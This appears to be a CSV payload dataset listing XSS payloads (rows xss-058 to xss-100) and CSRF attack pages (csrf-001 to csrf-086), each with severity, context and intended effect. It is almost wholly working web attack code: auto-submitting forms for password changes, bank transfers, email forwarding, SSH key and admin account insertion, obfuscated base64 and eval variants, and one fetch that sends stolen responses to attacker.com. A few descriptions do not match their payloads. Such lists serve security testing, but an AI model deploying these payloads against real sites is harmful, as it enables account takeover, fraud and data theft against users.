xss-058,xss,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",stored,high,User input field,Stored XSS using svg with animateTransform and onbegin event,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,xss,"<script>Function('alert(""XSS59"")')()</script>",reflected,high,URL parameter,Reflected XSS using script tag with Function constructor,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-060,xss,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",stored,high,User input field,Stored XSS using iframe with onload and encoded srcdoc,"User input: <iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
xss-061,xss,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,reflected,high,URL parameter,Reflected XSS using SVG with feImage and onload event,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,xss,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",stored,high,User input field,Stored XSS using details tag with ontoggle event and script,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,xss,"<math href='javascript:alert(""XSS63"")'>X</math>",reflected,high,URL parameter,Reflected XSS using math tag with href attribute and javascript URI,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,xss,"<audio src='x' onerror='alert(""XSS64"")'></audio>",stored,high,User input field,Stored XSS using audio tag with onerror event,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,xss,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with srcdoc and onload event,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,xss,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",stored,high,User input field,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,xss,"<input oninvalid='alert(""XSS67"")' required>",reflected,high,URL parameter,Reflected XSS using input tag with oninvalid event,"http://example.com/page?param=<input oninvalid='alert(""XSS67"")' required>"
xss-068,xss,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",stored,high,User input field,Stored XSS using iframe with allow attribute and srcdoc,"User input: <iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,xss,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onfocusin event,"http://example.com/page?param=<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,xss,"<video onpause='alert(""XSS70"")'></video>",stored,high,User input field,Stored XSS using video tag with onpause event,"User input: <video onpause='alert(""XSS70"")'></video>"
xss-071,xss,"<svg onmouseenter='alert(""XSS71"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onmouseenter event,"http://example.com/page?param=<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,xss,"<form oninput='alert(""XSS72"")'><input></form>",stored,high,User input field,Stored XSS using form tag with oninput event,"User input: <form oninput='alert(""XSS72"")'><input></form>"
xss-073,xss,"<svg onwheel='alert(""XSS73"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onwheel event,"http://example.com/page?param=<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,xss,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",stored,high,User input field,Stored XSS using iframe with allowfullscreen attribute and onload event,"User input: <iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,xss,"<svg onanimationend='alert(""XSS75"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onanimationend event,"http://example.com/page?param=<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,xss,"<audio onplay='alert(""XSS76"")'></audio>",stored,high,User input field,Stored XSS using audio tag with onplay event,"User input: <audio onplay='alert(""XSS76"")'></audio>"
xss-077,xss,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onscroll event,"http://example.com/page?param=<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,xss,"<iframe seamless onload='alert(""XSS78"")'></iframe>",stored,high,User input field,Stored XSS using iframe with seamless attribute and onload event,"User input: <iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,xss,"<svg oncut='alert(""XSS79"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with oncut event,"http://example.com/page?param=<svg oncut='alert(""XSS79"")'></svg>"
xss-080,xss,"<svg oncopy='alert(""XSS80"")'></svg>",stored,high,User input field,Stored XSS using svg with oncopy event,"User input: <svg oncopy='alert(""XSS80"")'></svg>"
xss-081,xss,"<svg onpaste='alert(""XSS81"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpaste event,"http://example.com/page?param=<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,xss,"<svg onreset='alert(""XSS82"")'></svg>",stored,high,User input field,Stored XSS using svg with onreset event,"User input: <svg onreset='alert(""XSS82"")'></svg>"
xss-083,xss,"<svg onsearch='alert(""XSS83"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onsearch event,"http://example.com/page?param=<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,xss,"<svg onselect='alert(""XSS84"")'></svg>",stored,high,User input field,Stored XSS using svg with onselect event,"User input: <svg onselect='alert(""XSS84"")'></svg>"
xss-085,xss,"<svg onshow='alert(""XSS85"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onshow event,"http://example.com/page?param=<svg onshow='alert(""XSS85"")'></svg>"
xss-086,xss,"<svg ontoggle='alert(""XSS86"")'></svg>",stored,high,User input field,Stored XSS using svg with ontoggle event,"User input: <svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,xss,"<svg ontransitionend='alert(""XSS87"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with ontransitionend event,"http://example.com/page?param=<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,xss,"<svg onunload='alert(""XSS88"")'></svg>",stored,high,User input field,Stored XSS using svg with onunload event,"User input: <svg onunload='alert(""XSS88"")'></svg>"
xss-089,xss,"<svg onvolumechange='alert(""XSS89"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onvolumechange event,"http://example.com/page?param=<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,xss,"<svg onwaiting='alert(""XSS90"")'></svg>",stored,high,User input field,Stored XSS using svg with onwaiting event,"User input: <svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,xss,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onwheel event and CSS animation,"http://example.com/page?param=<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,xss,"<svg onpointercancel='alert(""XSS92"")'></svg>",stored,high,User input field,Stored XSS using svg with onpointercancel event,"User input: <svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,xss,"<svg onpointerout='alert(""XSS93"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpointerout event,"http://example.com/page?param=<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,xss,"<svg onpointerover='alert(""XSS94"")'></svg>",stored,high,User input field,Stored XSS using svg with onpointerover event,"User input: <svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,xss,"<svg onpointerup='alert(""XSS95"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpointerup event,"http://example.com/page?param=<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,xss,"<svg onselectstart='alert(""XSS96"")'></svg>",stored,high,User input field,Stored XSS using svg with onselectstart event,"User input: <svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,xss,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onshow event and tabindex,"http://example.com/page?param=<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,xss,"<svg onstalled='alert(""XSS98"")'></svg>",stored,high,User input field,Stored XSS using svg with onstalled event,"User input: <svg onstalled='alert(""XSS98"")'></svg>"
xss-099,xss,"<svg onsubmit='alert(""XSS99"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onsubmit event,"http://example.com/page?param=<svg onsubmit='alert(""XSS99"")'></svg>"
xss-100,xss,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>",stored,high,User input field,Stored XSS using svg with onunload event and script,"User input: <svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>"
csrf-001,csrf,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,CSRF,high,Malicious webpage,CSRF using auto-submitting hidden form with POST method,Embed this form in a malicious page to auto-submit password change.
csrf-002,csrf,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,CSRF,medium,Malicious webpage,CSRF using image tag with GET request,Trigger account deletion via GET request.
csrf-003,csrf,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",CSRF,high,Malicious webpage,CSRF using XMLHttpRequest with credentials,Perform unauthorized money transfer.
csrf-004,csrf,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",CSRF,high,Malicious webpage,CSRF using fetch API with credentials,Change victim's email address.
csrf-005,csrf,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,CSRF,medium,Malicious webpage,CSRF using auto-submitting form with file upload,Upload malicious avatar file.
csrf-006,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh redirect with GET request,Subscribe victim to premium plan.
csrf-007,csrf,<script src='https://attacker.com/csrf-trigger.js'></script>,CSRF,high,Malicious webpage,CSRF using script tag to load external script triggering action,Load external script that performs CSRF.
csrf-008,csrf,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",CSRF,high,Malicious webpage,CSRF using iframe with auto-submitting form inside,Change user settings silently.
csrf-009,csrf,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,CSRF,high,Malicious webpage,CSRF using SVG with embedded script and form submission,Trigger delete API call.
csrf-010,csrf,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",CSRF,medium,Malicious webpage,CSRF using beacon API to send POST request,Send data to target endpoint.
csrf-011,csrf,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event to modify data,Modify data before submission.
csrf-012,csrf,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",CSRF,high,Malicious webpage,CSRF using image with onerror event to trigger XMLHttpRequest,Like a post on victim's behalf.
csrf-013,csrf,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with hidden inputs and auto-submit,Transfer money silently.
csrf-014,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",CSRF,high,Malicious webpage,CSRF using fetch with POST and custom headers,Attempt to bypass CSRF token.
csrf-015,csrf,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with enctype multipart/form-data,Upload file without user consent.
csrf-016,csrf,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",CSRF,high,Malicious webpage,CSRF using script with setTimeout to delay request,Delayed delete request.
csrf-017,csrf,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with target iframe to hide submission,Change settings silently.
csrf-018,csrf,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with GET method and auto-submit,Send friend request without user consent.
csrf-019,csrf,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using meta refresh with POST form submission via JavaScript,Subscribe victim to premium plan.
csrf-020,csrf,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>",CSRF,medium,Malicious webpage,CSRF using script with navigator.sendBeacon to send data,Send tracking data or trigger action.
csrf-021,csrf,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",CSRF,high,Malicious webpage,CSRF using stealth iframe with delayed form submission,
csrf-022,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",CSRF,critical,Malicious webpage,CSRF using fetch with chained promises to exfiltrate response,
csrf-023,csrf,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with multiple hidden inputs and auto-submit,
csrf-024,csrf,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",CSRF,high,Malicious webpage,CSRF using image with onload event triggering XMLHttpRequest,
csrf-026,csrf,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",CSRF,medium,Malicious webpage,CSRF using beacon API with custom payload,
csrf-027,csrf,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with enctype multipart/form-data and auto-submit,
csrf-028,csrf,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",CSRF,high,Malicious webpage,CSRF using iframe with srcdoc containing auto-submitting form,
csrf-029,csrf,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",CSRF,high,Malicious webpage,CSRF using script with setTimeout to chain multiple requests,
csrf-030,csrf,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with target iframe and hidden inputs,
csrf-031,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",CSRF,high,Malicious webpage,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),
csrf-032,csrf,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event modifying data,
csrf-033,csrf,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",CSRF,high,Malicious webpage,CSRF using image with onerror event triggering fetch,
csrf-034,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh to redirect to GET endpoint,
csrf-035,csrf,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,CSRF,critical,Malicious webpage,CSRF using script to create and submit form dynamically,
csrf-036,csrf,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with JSON payload (if API accepts),
csrf-037,csrf,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",CSRF,high,Malicious webpage,CSRF using form with multiple steps and chained submissions,
csrf-040,csrf,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",CSRF,high,Malicious webpage,CSRF using form with hidden iframe and delayed submission,
csrf-041,csrf,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",CSRF,high,Malicious webpage,CSRF using script to create image with onload triggering fetch,
csrf-042,csrf,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",CSRF,high,Malicious webpage,CSRF using form with multiple hidden inputs and chained submission,
csrf-043,csrf,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with custom headers and JSON body,
csrf-044,csrf,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event to modify hidden input,
csrf-045,csrf,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",CSRF,high,Malicious webpage,CSRF using image with onerror event to trigger XMLHttpRequest,
csrf-046,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh to redirect to sensitive GET endpoint,
csrf-047,csrf,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",CSRF,critical,Malicious webpage,CSRF using script to dynamically create and submit form with delay,
csrf-048,csrf,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with JSON body and credentials,
csrf-049,csrf,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",CSRF,high,Malicious webpage,CSRF using chained form submissions with timeouts,
csrf-051,csrf,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Admin panel user management,CSRF to add admin user via hidden form,
csrf-052,csrf,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Email service user settings,CSRF to change email notification settings,
csrf-053,csrf,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,CSRF,high,Security 2FA reset endpoint,CSRF to reset 2FA via GET request,
csrf-054,csrf,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,CSRF,medium,Streaming service subscription,CSRF to subscribe victim to premium service,
csrf-055,csrf,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,E-commerce user profile,CSRF to change victim's shipping address,
csrf-056,csrf,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media friend management,CSRF to add attacker as friend,
csrf-057,csrf,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Blog comment submission,CSRF to post malicious comment,
csrf-058,csrf,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media profile update,CSRF to change victim's profile picture,
csrf-059,csrf,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Online banking transfer,CSRF to initiate money transfer,
csrf-060,csrf,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Security settings,CSRF to disable security alerts,
csrf-061,csrf,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,User account management,CSRF to change victim's password,
csrf-062,csrf,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Continuous Integration webhook settings,CSRF to add malicious webhook URL,
csrf-063,csrf,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Calendar application settings,CSRF to change victim's timezone,
csrf-064,csrf,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Email forwarding settings,CSRF to enable auto-forwarding of emails,
csrf-065,csrf,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Git hosting service SSH keys,CSRF to add malicious SSH key,
csrf-066,csrf,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,User interface settings,CSRF to change victim's language preference,
csrf-067,csrf,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Newsletter subscription,CSRF to add victim to attacker's mailing list,
csrf-068,csrf,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media posting,CSRF to post malicious tweet,
csrf-069,csrf,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,SMS spam management,CSRF to add victim's phone number to spam list,
csrf-070,csrf,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Payment gateway account settings,CSRF to change victim's default payment method,
csrf-071,csrf,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Code review platform settings,CSRF to enable auto-approve on code reviews,
csrf-072,csrf,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,IoT device management,CSRF to add victim's device to attacker's monitoring,
csrf-073,csrf,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Calendar event management,CSRF to change victim's calendar event,
csrf-074,csrf,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Firewall management,CSRF to add victim's IP to blacklist,
csrf-075,csrf,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,DNS management,CSRF to change victim's DNS settings,
csrf-076,csrf,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Mailing list subscription,CSRF to add victim to attacker's mailing list,
csrf-077,csrf,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media profile,CSRF to change victim's profile bio,
csrf-079,csrf,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,App notification settings,CSRF to change victim's notification preferences,
csrf-080,csrf,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Payment gateway,CSRF to add victim's credit card to attacker's account,
csrf-081,csrf,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,CSRF,high,Dynamic base64 decoded form submission,CSRF with base64 encoded form and dynamic decoding,
csrf-082,csrf,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,CSRF,high,Hex encoded script with eval,CSRF with hex encoded script and eval,
csrf-083,csrf,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>",CSRF,high,Dynamic iframe with form,CSRF with dynamically created iframe and delayed form submission,
csrf-084,csrf,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,String concatenation obfuscation,CSRF with obfuscated string concatenation,
csrf-085,csrf,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",CSRF,medium,User interaction triggered CSRF,CSRF with event-triggered form submission on mouseover,
csrf-086,csrf,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",CSRF,high,Delayed form submission,CSRF with delayed execution using setTimeout and obfuscated function,
